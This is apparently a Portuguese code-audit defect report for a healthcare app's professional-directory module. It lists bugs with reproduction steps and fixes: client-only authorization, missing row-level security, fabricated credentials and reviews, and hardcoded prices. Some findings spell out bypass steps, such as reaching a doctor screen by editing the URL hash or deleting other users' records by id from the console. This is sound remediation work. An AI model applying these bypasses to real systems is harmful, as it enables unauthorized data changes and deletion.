# 18. Rede de profissionais

**25 defeitos** — 0 crítico · 7 alto · 8 médio · 10 baixo

Arquivos tocados por este módulo:

- `src/components/DoctorPartners.jsx`
- `src/components/MyNetworkPortal.jsx`
- `src/components/NursesNetwork.jsx`
- `src/components/SpecialistDirectory.jsx`

> Leia `INDEX.md` antes de começar. Um commit por defeito. Ao terminar o módulo, rode a verificação do rodapé e marque as linhas correspondentes em `STATUS.md`.

---

## IREC-0110 · ALTO · `CONFIRMAR-SCHEMA`

**Central de Parcerias do médico acessível a qualquer papel (permissão apenas no client, sem RLS)**

**Onde:** `src/components/DoctorPartners.jsx:4`

**O defeito:** O componente não valida doctorProfile.role e recebe doctorProfile={currentUser} (App.jsx:875). O switch de renderContent não tem nenhuma trava de papel, e o activeTab inicial é lido do hash da URL (App.jsx:37-43) e também restaurado de localStorage sem filtro de papel (App.jsx:466-469). Assim, um paciente chega à tela de monetização do médico e consegue inserir linhas em recommended_materials com doctor_id igual ao próprio id de paciente. O schema v5 não cria nenhuma policy de RLS para recommended_materials (clean_database_v5.sql inteiro não tem CREATE POLICY), portanto a inserção é aceita pelo banco. Esses registros do tipo 'doctor_general_partner' passam a ser candidatos a aparecer nos protocolos (ProtocolGuide.jsx:332-336).

**Como falha:** Paciente logado edita a URL para https://app/#doctor-partners e recarrega (ou simplesmente reabre o app num navegador onde um médico ficou por último em 'doctor-partners', pois irec_active_tab é restaurado sem checar papel). A tela 'Central de Parcerias e Insumos Afiliados' é renderizada; ele cadastra links de afiliado com doctor_id = seu próprio uuid, gravados no banco sem qualquer bloqueio.

**Código atual:**

```jsx
DoctorPartners.jsx:4
export default function DoctorPartners({ doctorProfile }) {
App.jsx:874-875
      case 'doctor-partners':
        return <DoctorPartners doctorProfile={currentUser} />;
App.jsx:37-43
  const [activeTab, setActiveTabRaw] = useState(() => {
    if (typeof window !== 'undefined' && window.location.hash) {
      const hashTab = window.location.hash.replace('#', '').trim();
      if (hashTab) return hashTab;
App.jsx:467-469
        const savedTab = localStorage.getItem('irec_active_tab');
        if (savedTab) {
          setActiveTab(savedTab);
```

**Correção sugerida:** Adicionar guarda de papel no case 'doctor-partners' (renderizar apenas para role 'doctor'/'nurse') e criar policies de RLS em recommended_materials restringindo insert/update a doctor_id = auth.uid().

<details><summary>Verificação feita contra o código</summary>

Verificado ponto a ponto: DoctorPartners.jsx:4 nao valida role; App.jsx:874-875 passa doctorProfile={currentUser} sem checagem; App.jsx:37-43 le a aba inicial do hash e App.jsx:466-469 restaura irec_active_tab sem filtrar papel (o fallback por papel nas linhas 471-477 so roda quando NAO ha aba salva). clean_database_v5.sql nao contem ENABLE ROW LEVEL SECURITY nem CREATE POLICY para recommended_materials, e doctor_id referencia clinical_profile(id) — que tambem guarda pacientes —, entao o FK aceita o uuid do paciente. Autorizacao 100% no cliente.

</details>

> ⚠️ **Antes de aplicar:** confirme o nome real do campo/coluna contra o schema do Supabase. A sugestão acima foi inferida de `src/services/supabaseService.js`, sem acesso ao banco. Se o schema divergir, corrija a sugestão — não aplique às cegas.

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0111 · ALTO · `CONFIRMAR-SCHEMA`

**Cadastro de parceria sempre falha: string 'A consultar' gravada em coluna numeric(10,2)**

**Onde:** `src/components/DoctorPartners.jsx:57`

**O defeito:** O payload de farmácia envia price: 'A consultar' e o de insumo envia price: prodPrice || 'A consultar' (campo de texto livre, placeholder 'Ex: R$ 42,00'). A coluna price da tabela recommended_materials é numeric(10,2) (clean_database_v5.sql:17). O INSERT do Postgres falha com 22P02 (invalid input syntax for type numeric), addRecommendedMaterial relança o erro (supabaseService.js:2568) e o componente apenas exibe um alert genérico. Toda a Central de Parcerias fica inoperante quando o Supabase está configurado; só funciona no modo contingência (localStorage), onde o valor é salvo como texto — divergência total de comportamento entre os dois modos.

**Como falha:** Médico verificado abre 'Minhas Parcerias' > 'Adicionar Farmácia Parceira', preenche 'Drogasil Itapuranga' e o link de afiliado (ambos válidos) e clica em 'Vincular Farmácia'. Aparece o alert 'Erro ao cadastrar farmácia parceira.', a modal continua aberta e nada é gravado — falha em 100% das tentativas. Idêntico em 'Adicionar Insumo Parceiro', inclusive quando o médico digita 'R$ 42,00' ou '42,00' em Preço Sugerido.

**Código atual:**

```jsx
DoctorPartners.jsx:53-62
      const payload = {
        name: pharmacyName,
        brand: 'Parceria de Vendas Geral',
        price: 'A consultar',
...
DoctorPartners.jsx:93
        price: prodPrice || 'A consultar',
...
clean_database_v5.sql:17
  price numeric(10,2),
```

**Correção sugerida:** Converter o preco para numero antes do insert (ex.: price: prodPrice ? Number(String(prodPrice).replace(/[^\d,.]/g,'').replace(',','.')) : null) e enviar null no payload de farmacia.

<details><summary>Verificação feita contra o código</summary>

Verificado nos dois lados: DoctorPartners.jsx:56 envia price:'A consultar' e :93 price: prodPrice || 'A consultar' (input de texto livre), e clean_database_v5.sql:17 define price numeric(10,2). addRecommendedMaterial (supabaseService.js:2557-2569) faz insert direto e relança o erro; o componente só exibe alert generico. Nao ha nenhuma conversao/sanitizacao entre o form e o insert. Severidade rebaixada de critico para alto: a falha e total no modulo, mas ocorre apenas com Supabase configurado (hoje o repo roda em contingencia, onde o valor e salvo como texto), falha de forma visivel e nao corrompe nem expoe dados clinicos.

</details>

> ⚠️ **Antes de aplicar:** confirme o nome real do campo/coluna contra o schema do Supabase. A sugestão acima foi inferida de `src/services/supabaseService.js`, sem acesso ao banco. Se o schema divergir, corrija a sugestão — não aplique às cegas.

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0115 · ALTO · `CONFIRMAR-SCHEMA`

**Bio, formação e valor reais do enfermeiro nunca chegam ao diretório (campos não mapeados no service)**

**Onde:** `src/components/NursesNetwork.jsx:54`

**O defeito:** O componente lê doc.consultationFee, doc.bio e doc.education, mas getAllNurses (supabaseService.js:1274-1292) NÃO seleciona/mapeia consultation_fee, bio nem education — o objeto retornado só tem id, role, name, email, crm, specialty, rqe, birthDate, gender, healthUnit, phone, avatarUrl, city, state, lastSeenAt, verificationStatus, professionalDocumentUrl. Como getProfile mapeia esses campos (supabaseService.js:618-620) e UserProfileModal os grava (linha 246), o profissional é obrigado a preenchê-los (bloqueio de completude do DoctorDashboard) e nada aparece. Resultado: price sempre null, bio sempre o texto genérico e education sempre 'Registro Profissional: <crm>'. No modo contingência (localStorage) funciona, porque getLocalProfile devolve o perfil inteiro — comportamento divergente entre modos.

**Como falha:** Enfermeira estomaterapeuta preenche no perfil 'Valor da Consulta: 180', bio e formação (obrigatórios para liberar o painel). O paciente abre 'Encontrar Enfermeiros' e vê 'Visita Domiciliar: Sob Consulta', 'Sobre o Profissional: Enfermeiro(a) cadastrado(a) no iRec.' e 'Formação: Registro Profissional: COREN-GO 123456'. Nenhum dado que ela cadastrou é exibido.

**Código atual:**

```jsx
NursesNetwork.jsx:51-56
      specialty: doc.specialty || 'Enfermagem Geral',
      bio: doc.bio || 'Enfermeiro(a) cadastrado(a) no iRec.',
      education: doc.education || `Registro Profissional: ${doc.crm || doc.coren || 'Não informado'}`,
      price: doc.consultationFee ? parseFloat(doc.consultationFee) : null,
...
supabaseService.js:1274-1292 (getAllNurses) — retorna apenas: id, role, name, email, crm, specialty, rqe, birthDate, gender, healthUnit, phone, avatarUrl, city, state, lastSeenAt, verificationStatus, professionalDocumentUrl
```

**Correção sugerida:** Incluir bio: item.bio || '', education: item.education || '' e consultationFee: item.consultation_fee ? parseFloat(item.consultation_fee) : null no map de getAllNurses (e de getAllDoctors).

<details><summary>Verificação feita contra o código</summary>

getAllNurses (supabaseService.js:1274-1292) faz select('*') mas remapeia manualmente apenas 16 campos — bio, education e consultation_fee nao estao entre eles, apesar de existirem no schema (clean_database_v5.sql:6-8). Como NursesNetwork.jsx:52-54 le doc.bio, doc.education e doc.consultationFee, o resultado e sempre o texto generico 'Enfermeiro(a) cadastrado(a) no iRec.', 'Registro Profissional: <crm>' e price null ('Sob Consulta' nas linhas 262 e 433). Confirmado tambem que o mesmo vale para o ramo demo, que por isso cai no preco fabricado.

</details>

> ⚠️ **Antes de aplicar:** confirme o nome real do campo/coluna contra o schema do Supabase. A sugestão acima foi inferida de `src/services/supabaseService.js`, sem acesso ao banco. Se o schema divergir, corrija a sugestão — não aplique às cegas.

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0116 · ALTO · `CONFIRMADO`

**Credenciais, preços, notas e depoimentos de enfermeiros são FABRICADOS e exibidos como reais**

**Onde:** `src/components/NursesNetwork.jsx:62`

**O defeito:** getNursePremiumDetails mantém um array de 3 perfis inventados (bio, formação acadêmica, preço, rating 4.9, '240+' pacientes, '98%' de sucesso e depoimentos de pacientes fictícios). Quando o e-mail do profissional contém 'example.com', 'demo.com' ou 'mock', o perfil recebe um desses blocos escolhido por hash determinístico do id (idHash % specialties.length) e é renderizado no cartão e no drawer clínico sem qualquer marcação de 'demonstração', ao lado do selo '✅ Verificado' e do texto 'Registro profissional ativo no COREN com Habilitação Clínica'. São credenciais profissionais e depoimentos de saúde inventados apresentados a pacientes como informação verdadeira.

**Como falha:** Existe na base um enfermeiro cadastrado com e-mail em domínio que contenha 'demo.com' (ex.: contato@clinicademo.com.br) ou 'example.com'. O paciente abre 'Minha Rede' > 'Encontrar Enfermeiros', vê o cartão com preço 'R$ 145,00' e, ao abrir o perfil, lê 'Graduação em Enfermagem - UNIFESP; Especialização em Pé Diabético', mais o depoimento 'Cuidado exemplar com o pé diabético do meu pai. Evitou uma internação grave.' — nada disso foi informado pelo profissional nem existe no banco. O paciente escolhe e paga a visita domiciliar com base em dados inventados.

**Código atual:**

```jsx
NursesNetwork.jsx:21-29
      specialty: 'Pé Diabético e Lesões por Pressão',
      bio: 'Atendimento estomaterápico especializado em offloading...',
      education: 'Graduação em Enfermagem - UNIFESP; Especialização em Pé Diabético e Cicatrização de Feridas Complexas.',
      price: 145,
      stats: { rating: '4.8', patients: '180+', successRate: '97.2%' },
      reviews: [ { patient: 'T. O.', text: 'Cuidado exemplar com o pé diabético do meu pai. Evitou uma internação grave.' } ]
...
NursesNetwork.jsx:60-72
  let specProfile = specialties.find(...);
  if (!specProfile) {
    specProfile = specialties[idHash % specialties.length];
  }
  return { ...doc, bio: doc.bio || specProfile.bio, education: doc.education || specProfile.education, ... reviews: specProfile.reviews };
```

**Correção sugerida:** Remover reviews/stats/price fabricados do retorno e exibir apenas dados reais, ou marcar visivelmente o cartao como 'Perfil de demonstração' quando isDemoNurse for verdadeiro.

<details><summary>Verificação feita contra o código</summary>

O array de 3 perfis inventados existe (linhas 9-41) e o ramo demo (linhas 43-73) seleciona um bloco por idHash % specialties.length quando o e-mail contem example.com/demo.com/mock. Ha guardas parciais que o auditor nao mencionou: bio, education e specialty usam fallback (doc.bio || specProfile.bio) e o preco respeita doc.consultationFee — mas stats e reviews sao SEMPRE substituidos pelos fabricados (linhas 71-72), e o preco cai no valor inventado (130/145/110) porque consultationFee nunca chega do service. Esses dados sao renderizados no drawer sob 'Depoimentos de Pacientes' (linha 456) e 'Valor do Procedimento Domiciliar' (linha 433) sem qualquer marcacao de demonstracao. Severidade ajustada para alto: exige um perfil verificado com e-mail em dominio demo, que na pratica so existe em contas semeadas.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0117 · ALTO · `VERIFICAR`

**Agendamento cobra valor inventado (R$ 130 / R$ 250) por price nulo**

**Onde:** `src/components/NursesNetwork.jsx:519`

**O defeito:** Os dois diretórios entregam ao BookingModal o objeto enriquecido, cujo price é null para todo profissional real (ver achados anteriores). BookingModal.jsx:27 faz `const price = professional.price || professional.consultationFee || (isNurse ? 130 : 250);` — um valor hardcoded. Esse valor entra no QR/código PIX (BookingModal.jsx:29) e é gravado no agendamento com paymentStatus: 'paid' (linhas 70-72). O paciente paga, e o profissional recebe um agendamento com preço que ninguém configurou.

**Como falha:** Paciente clica em 'AGENDAR VISITA / CURATIVO' no cartão de uma enfermeira real (preço exibido 'Sob Consulta'), avança para o pagamento e vê 'R$ 130,00' com código PIX gerado sobre esse valor. Confirma o pagamento; o registro em appointments fica com price: 130 e paymentStatus 'paid'. O mesmo ocorre em 'CONTRATAR CONSULTA' do diretório médico, sempre com R$ 250.

**Código atual:**

```jsx
NursesNetwork.jsx:517-523
      {bookingNurse && (
        <BookingModal
          professional={bookingNurse}
...
BookingModal.jsx:27
  const price = professional.price || professional.consultationFee || (isNurse ? 130 : 250);
BookingModal.jsx:70-72
        price: price,
        paymentMethod: paymentMethod,
        paymentStatus: 'paid',
```

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0137 · ALTO · `CONFIRMAR-SCHEMA`

**Preço do médico lido de campo inexistente (doc.price em vez de consultationFee)**

**Onde:** `src/components/SpecialistDirectory.jsx:66`

**O defeito:** Para profissionais reais o preço é lido de doc.price, propriedade que não existe em nenhum mapeamento de perfil: o campo persistido é consultation_fee, exposto como consultationFee (supabaseService.js:620, UserProfileModal.jsx:246). Além disso getAllDoctors também não mapeia consultation_fee. Logo doc.price é sempre undefined e price sempre null, exibindo 'Sob Consulta' para 100% dos médicos verificados — e, consequentemente, acionando o preço inventado do BookingModal.

**Como falha:** Médico dermatologista define 'Valor da Consulta: 350' no perfil. Qualquer paciente que abra 'Médicos Especialistas' vê 'Particular: Sob Consulta' no cartão e 'Valor da Consulta Particular: Sob Consulta' no drawer, e ao contratar é cobrado R$ 250 (fallback do BookingModal), não os R$ 350 configurados.

**Código atual:**

```jsx
SpecialistDirectory.jsx:60-69
  if (!isDemoDoctor) {
    return {
      ...doc,
      ...
      price: doc.price || null,
...
supabaseService.js:620
      consultationFee: data.consultation_fee ? parseFloat(data.consultation_fee) : null,
```

**Correção sugerida:** Trocar por price: doc.consultationFee ? parseFloat(doc.consultationFee) : null e mapear consultation_fee em getAllDoctors.

<details><summary>Verificação feita contra o código</summary>

SpecialistDirectory.jsx:66 usa doc.price || null, mas nenhum mapeamento produz 'price': o schema tem consultation_fee (clean_database_v5.sql:8) e getAllDoctors (supabaseService.js:1323-1341) nao mapeia esse campo em nenhuma forma. Logo doc.price e sempre undefined e todo medico verificado exibe 'Sob Consulta', encadeando no fallback hardcoded do BookingModal (item 50123).

</details>

> ⚠️ **Antes de aplicar:** confirme o nome real do campo/coluna contra o schema do Supabase. A sugestão acima foi inferida de `src/services/supabaseService.js`, sem acesso ao banco. Se o schema divergir, corrija a sugestão — não aplique às cegas.

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0138 · ALTO · `CONFIRMADO`

**Diretório de médicos SOBRESCREVE bio e formação reais por texto fabricado**

**Onde:** `src/components/SpecialistDirectory.jsx:80`

**O defeito:** No ramo 'demo', diferente de NursesNetwork (que usa doc.bio || specProfile.bio), aqui bio, education e price são atribuídos SEM fallback para o valor real do profissional: bio: specProfile.bio / education: specProfile.education / price: specProfile.price. Ou seja, mesmo que o médico tenha preenchido bio e formação verdadeiras (campos obrigatórios que desbloqueiam o painel clínico, ver DoctorDashboard.jsx:866-882), o diretório descarta o conteúdo real e mostra texto inventado. Pior: o bloco 'Estomaterapia' atribui a um MÉDICO a formação 'Doutorado em Enfermagem Clínica - USP; Especialização em Estomaterapia - SOBEST', renderizada sob os rótulos 'Sobre o Médico' e 'CRM'. Também são exibidas taxas de sucesso ('98.5%') e depoimentos de pacientes inexistentes.

**Como falha:** Um médico angiologista cujo e-mail institucional contenha 'demo.com'/'example.com' preenche corretamente sua bio e sua formação no perfil. O paciente abre 'Médicos Especialistas', clica no cartão e lê no drawer 'Formação e Certificações: Doutorado em Enfermagem Clínica - USP' e 'Valor da Consulta Particular: R$ 280,00' — texto e preço que o médico nunca cadastrou, com dois depoimentos de pacientes fictícios logo abaixo.

**Código atual:**

```jsx
SpecialistDirectory.jsx:77-85
  return {
    ...doc,
    specialty: doc.specialty || specProfile.specialty,
    bio: specProfile.bio,
    education: specProfile.education,
    price: specProfile.price || null,
    stats: specProfile.stats,
    reviews: specProfile.reviews
  };
(compare com NursesNetwork.jsx:68 -> bio: doc.bio || specProfile.bio)
```

**Correção sugerida:** Aplicar fallback ao dado real (bio: doc.bio || specProfile.bio, education: doc.education || specProfile.education) e nunca sobrescrever formação/preço informados pelo profissional.

<details><summary>Verificação feita contra o código</summary>

SpecialistDirectory.jsx:77-85 atribui bio: specProfile.bio, education: specProfile.education e price: specProfile.price sem fallback para o dado real, ao contrario de NursesNetwork.jsx:68-70 que usa doc.bio || specProfile.bio — a divergencia apontada e exata. O bloco 'Estomaterapia' (linhas 11-20) realmente contem 'Doutorado em Enfermagem Clinica - USP' e e o bloco selecionado por especialidade contendo 'estomaterapia', sendo exibido sob rotulos de medico. Reviews e taxas de sucesso tambem sao fixos. Mesma ressalva de alcance do item 50119 (exige e-mail em dominio demo), por isso alto e nao critico.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0295 · MÉDIO · `CONFIRMADO`

**Falha de carregamento das parcerias é apresentada como catálogo vazio**

**Onde:** `src/components/DoctorPartners.jsx:32`

**O defeito:** loadMaterials trata qualquer erro apenas com console.error e o finally zera loading, mantendo materials como []. A tela então renderiza o estado vazio 'Nenhuma Farmácia Geral Vinculada', indistinguível de uma falha real de rede/parse. Note que getRecommendedMaterials faz JSON.parse do localStorage FORA do try/catch no modo contingência (supabaseService.js:2494-2495), logo um valor corrompido chega aqui como exceção. Não há botão de tentar novamente nem mensagem de erro.

**Como falha:** O médico abre 'Minhas Parcerias' com a rede instável (ou com irec_local_recommended_materials corrompido no modo contingência). A consulta falha, a tela mostra 'Nenhuma Farmácia Geral Vinculada / Cadastre Minha Primeira Farmácia' e os contadores 0 e 0. O médico conclui que suas parcerias foram apagadas e recadastra tudo, gerando duplicidade quando a leitura voltar a funcionar.

**Código atual:**

```jsx
DoctorPartners.jsx:25-37
  const loadMaterials = async () => {
    if (!doctorProfile) return;
    setLoading(true);
    try {
      const data = await getRecommendedMaterials(null, doctorProfile.id);
      setMaterials(data);
    } catch (e) {
      console.error('Erro ao buscar parcerias do médico:', e);
    } finally {
      setLoading(false);
    }
  };
supabaseService.js:2494-2495 (fora do try)
    const data = localStorage.getItem('irec_local_recommended_materials') || '[]';
    const list = JSON.parse(data);
```

**Correção sugerida:** Guardar um estado de erro e renderizar 'Não foi possível carregar suas parcerias' com botão 'Tentar novamente', em vez do estado vazio.

<details><summary>Verificação feita contra o código</summary>

loadMaterials (linhas 25-37) so faz console.error e mantem materials como []; a tela cai no estado vazio 'Nenhuma Farmacia Geral Vinculada' (linhas 239-253), indistinguivel de falha. Na verdade e ainda mais silencioso do que o auditor descreve: getRecommendedMaterials ja engole o erro do Supabase e retorna [] (supabaseService.js:2537-2540), entao o catch do componente nem chega a rodar nesse caminho. O JSON.parse fora do try no modo contingencia (linhas 2494-2495) confirma o caminho que de fato lanca. Nao ha mensagem de erro nem botao de tentar novamente.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0296 · MÉDIO · `CONFIRMAR-SCHEMA`

**Exclusão de parceria por id, sem checagem de propriedade e sem RLS, com ids sequenciais**

**Onde:** `src/components/DoctorPartners.jsx:124`

**O defeito:** handleDelete chama deleteRecommendedMaterial(id), que executa .delete().eq('id', id) sem filtrar doctor_id (supabaseService.js:2582-2585). A chave primária é bigint GENERATED ALWAYS AS IDENTITY (ids sequenciais e adivinháveis) e o schema v5 não define nenhuma policy de RLS para recommended_materials. A única barreira é a UI listar apenas os itens do próprio médico — ou seja, autorização puramente no client, em serviço chamado direto do browser.

**Como falha:** Um usuário autenticado (médico ou paciente que alcançou a tela pelo hash #doctor-partners) chama deleteRecommendedMaterial(37) pelo console e apaga a parceria de afiliado de outro médico, ou um item global do iRec cadastrado pelo admin. O outro médico perde o vínculo de monetização sem qualquer registro de auditoria.

**Código atual:**

```jsx
DoctorPartners.jsx:121-130
  const handleDelete = async (id) => {
    if (!window.confirm('Tem certeza que deseja remover esta indicação parceira do seu catálogo?')) return;
    try {
      await deleteRecommendedMaterial(id);
supabaseService.js:2582-2585
    const { error } = await supabase
      .from('recommended_materials')
      .delete()
      .eq('id', id);
clean_database_v5.sql:12  id bigint GENERATED ALWAYS AS IDENTITY PRIMARY KEY  (nenhum CREATE POLICY no arquivo)
```

**Correção sugerida:** Passar o doctorId e filtrar no delete (.eq('id', id).eq('doctor_id', doctorId)) e criar policy de RLS de DELETE restrita a doctor_id = auth.uid().

<details><summary>Verificação feita contra o código</summary>

deleteRecommendedMaterial (supabaseService.js:2582-2585) faz .delete().eq('id', id) sem filtro de doctor_id; a PK e bigint GENERATED ALWAYS AS IDENTITY (clean_database_v5.sql:12), portanto enumeravel; e o arquivo de schema nao tem ENABLE ROW LEVEL SECURITY nem policy alguma para a tabela. handleDelete (DoctorPartners.jsx:121-130) so confirma via window.confirm. A unica barreira e a UI listar apenas os itens do proprio medico — autorizacao no cliente, em servico chamado direto do browser.

</details>

> ⚠️ **Antes de aplicar:** confirme o nome real do campo/coluna contra o schema do Supabase. A sugestão acima foi inferida de `src/services/supabaseService.js`, sem acesso ao banco. Se o schema divergir, corrija a sugestão — não aplique às cegas.

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0312 · MÉDIO · `CONFIRMADO`

**Cartões de navegação são <div> com onClick, sem role, foco ou teclado**

**Onde:** `src/components/MyNetworkPortal.jsx:67`

**O defeito:** Os quatro cartões do portal 'Minha Rede de Apoio' são <div> com onClick, sem role="button", sem tabIndex e sem onKeyDown/onKeyPress. Não recebem foco por Tab, não são anunciados como controles por leitores de tela e não podem ser acionados por Enter/Espaço. Como este portal é o ÚNICO ponto de entrada da barra lateral/rodapé do paciente para 'Encontrar Enfermeiros', 'Médicos Especialistas' e 'Guia de Tratamentos' (App.jsx:1293-1294 e 1850-1851), quem navega por teclado fica sem acesso a essas telas.

**Como falha:** Paciente idoso com deficiência motora que usa apenas teclado (ou leitor de tela) clica em 'Minha Rede / Especialistas' no menu, chega ao portal e pressiona Tab repetidamente: nenhum dos quatro cartões recebe foco e Enter não faz nada. Ele não consegue chegar ao diretório de enfermeiros por nenhum outro caminho na interface padrão.

**Código atual:**

```jsx
MyNetworkPortal.jsx:66-71
        {cards.map((card) => (
          <div 
            key={card.id} 
            className="glass-card" 
            onClick={() => setActiveTab(card.target)}
            style={{ ... cursor: 'pointer', ...
```

**Correção sugerida:** Trocar os <div> clicáveis por <button type="button"> (ou adicionar role="button", tabIndex={0} e onKeyDown para Enter/Espaço).

<details><summary>Verificação feita contra o código</summary>

MyNetworkPortal.jsx:66-93 confirma <div> com onClick, sem role, tabIndex ou onKeyDown — inacessivel por teclado e nao anunciado como controle. Ressalva a premissa do auditor: o portal NAO e o unico ponto de entrada — App.jsx:1697 e 1706 (menu 'mais' mobile), ClinicalTriage.jsx:1107, PatientAppointmentsCalendar.jsx:182/573 e AccessibleDashboard.jsx:460/578 tambem levam aos diretorios; porem os do App.jsx tambem sao <div> onClick, entao a barreira de teclado permanece nos caminhos principais. Severidade mantida em medio pelo bloqueio real de navegacao por teclado, nao pela alegacao de inacessibilidade total.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0313 · MÉDIO · `CONFIRMADO`

**Selo '✅ Verificado' e 'Registro ativo no COREN' são fixos, não derivados dos dados**

**Onde:** `src/components/NursesNetwork.jsx:247`

**O defeito:** O selo de verificação e o banner 'Enfermeiro(a) Verificado(a) iRec / Registro profissional ativo no COREN com Habilitação Clínica' são texto fixo, sem consultar doc.verificationStatus (campo que existe e é retornado por getAllNurses). No fallback local de getAllNurses/getAllDoctors entram perfis NÃO verificados cujo nome contenha 'teste' (supabaseService.js:1260 e 1296), que passam a exibir o selo de verificado. Pior: o mesmo card afirma registro ativo e, duas linhas abaixo, mostra 'COREN: Dispensado' quando o campo crm está vazio — afirmações contraditórias sobre habilitação profissional.

**Como falha:** No modo contingência (Supabase indisponível), um perfil de enfermeiro chamado 'Enf. Teste' com verificationStatus 'pending' e sem COREN preenchido aparece no diretório com '✅ Verificado', 'Registro profissional ativo no COREN com Habilitação Clínica' e 'COREN: Dispensado'. O paciente contrata uma visita domiciliar acreditando que o registro foi validado.

**Código atual:**

```jsx
NursesNetwork.jsx:247-249
                    <span style={{ ... }}>
                      ✅ Verificado
                    </span>
NursesNetwork.jsx:412-413
                    <p style={{...}}>Enfermeiro(a) Verificado(a) iRec</p>
                    <p style={{...}}>Registro profissional ativo no COREN com Habilitação Clínica.</p>
NursesNetwork.jsx:394
                      COREN: {doc.crm || 'Dispensado'}
supabaseService.js:1296 (fallback) .filter(p => p && (p.verificationStatus === 'verified' || p.name?.toLowerCase().includes('teste')))
```

**Correção sugerida:** Renderizar o selo/banner condicionalmente a doc.verificationStatus === 'verified' e ocultar a afirmação de registro ativo quando doc.crm estiver vazio.

<details><summary>Verificação feita contra o código</summary>

O selo (linhas 247-249) e o banner (linhas 412-413) sao texto fixo, sem consultar doc.verificationStatus, que existe e e retornado por getAllNurses (supabaseService.js:1290). No caminho Supabase ha uma guarda parcial (.eq('verification_status','verified') na linha 1268), mas nos fallbacks locais (linhas 1260 e 1296 — o caminho ATIVO hoje, com .env vazio) entram perfis nao verificados cujo nome contenha 'teste'. A contradicao 'Registro ativo no COREN' + 'COREN: Dispensado' (linha 394) tambem se confirma.

</details>

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0314 · MÉDIO · `CONFIRMAR-SCHEMA`

**Cartões e mensagem 'Nenhum enfermeiro disponível' aparecem ao mesmo tempo (filtro duplicado divergente)**

**Onde:** `src/components/NursesNetwork.jsx:304`

**O defeito:** A grade filtra a lista ENRIQUECIDA (allNurses.map(getNursePremiumDetails).filter(...)), mas o estado vazio refaz o mesmo filtro sobre allNurses CRU. Como o enriquecimento preenche specialty ausente ('Enfermagem Geral' para reais, ou a especialidade inventada para 'demo'), os dois filtros divergem: o card é renderizado e a mensagem de vazio também. O mesmo defeito existe em SpecialistDirectory.jsx:309-313 (specialty crua vazia vs 'Clínico Geral').

**Como falha:** Existe um enfermeiro verificado com o campo specialty vazio no banco. O paciente seleciona 'Enfermagem Geral' no seletor de especialidade: o cartão do enfermeiro aparece (especialidade enriquecida 'Enfermagem Geral' casa com o filtro) e, logo abaixo, ocupando toda a largura da grade, aparece 'Nenhum enfermeiro disponível para os filtros aplicados.' — dois estados contraditórios na mesma tela.

**Código atual:**

```jsx
NursesNetwork.jsx:180-186 (grade, lista enriquecida)
        {allNurses
          .map(doc => getNursePremiumDetails(doc))
          .filter(doc => { ... doc.specialty?.toLowerCase().includes(filterSpecialty.toLowerCase()) ... })
NursesNetwork.jsx:304-308 (estado vazio, lista crua)
        {allNurses.filter(doc => {
          const matchesSearch = doc.name?.toLowerCase().includes(searchQuery.toLowerCase());
          const matchesSpecialty = filterSpecialty === 'all' || doc.specialty?.toLowerCase().includes(filterSpecialty.toLowerCase());
          return matchesSearch && matchesSpecialty;
        }).length === 0 && (
```

**Correção sugerida:** Extrair a lista filtrada para uma const (`const visibleNurses = allNurses.map(getNursePremiumDetails).filter(...)`) e usar visibleNurses tanto na grade quanto na checagem de vazio.

<details><summary>Verificação feita contra o código</summary>

A grade filtra a lista enriquecida (linhas 180-186) e o estado vazio refaz o filtro sobre allNurses cru (linhas 304-308); em SpecialistDirectory.jsx:309-313 e identico. Como o enriquecimento preenche specialty ausente com 'Enfermagem Geral'/'Clinico Geral' (NursesNetwork:51, SpecialistDirectory:63), um profissional sem especialidade cadastrada casa em um filtro e nao no outro, renderizando cartao e mensagem de vazio simultaneamente. Nao ha nenhuma guarda entre os dois blocos.

</details>

> ⚠️ **Antes de aplicar:** confirme o nome real do campo/coluna contra o schema do Supabase. A sugestão acima foi inferida de `src/services/supabaseService.js`, sem acesso ao banco. Se o schema divergir, corrija a sugestão — não aplique às cegas.

**Feito quando:** reproduzir o cenário acima e o resultado errado não ocorrer mais.

---

## IREC-0315 · MÉDIO · `CONFIRMADO`

**Retorno de followPatient ignorado: vínculo pode falhar e a UI segue como se tivesse dado certo**

**Onde:** `src/components/NursesNetwork.jsx:496`

**O defeito:** followPatient nunca lança exceção: ela captura todos os erros do Supabase, cai no fallback de localStorage e retorna true; e retorna false silenciosamente quando doctorId ou patientId são falsy (supabaseService.js:1588). O componente ignora o valor de retorno, fecha o drawer, incrementa refreshTrigger e navega para 'telemedicine' como se o acompanhamento tivesse sido criado. O bloco catch (linhas 501-503) é código praticamente inalcançável e, mesmo se executado, só faz console.error — o paciente não recebe nenhuma mensagem de erro. O mesmo padrão está em SpecialistDirectory.jsx:499-509.

**Como falha:** Paciente cujo currentUser.id está ausente/indefinido (perfil restaurado parcialmente de localStorage) abre o perfil de uma enfermeira e clica em 'Iniciar Acompanhamento Clínico'. followPatient retorna false sem gravar nada; o drawer fecha, o app navega para a tela de mensagens e nenhum vínculo existe. O paciente acredita estar acompanhado por um profissional que nunca foi vinculado, e o erro não aparece em lugar algum da interface.

**Código atual:**

```jsx
NursesNetwork.jsx:494-504
                    onClick={async () => {
                      try {
                        await followPatient(doc.id, currentUser.id);
                        setRefreshTrigger(prev => prev + 1);
                        setSelectedNurse(null);
                        setTelemedicineContactId(doc.id);
                        setActiveTab('telemedicine');
                      } catch (err) {
                        console.error('Error establishing connection:', err);
                      }
                    }}
supabaseService.js:1587-1588
export const followPatient = async (doctorId, patientId) => {
  if (!doctorId || !patientId) return false;
```

**Correção sugerida:** Checar o retorno (`const ok = await followPatient(...); if (!ok) { mostrar erro e abortar a navegação; }`) e fazer followPatient sinalizar quando caiu no fallback local.

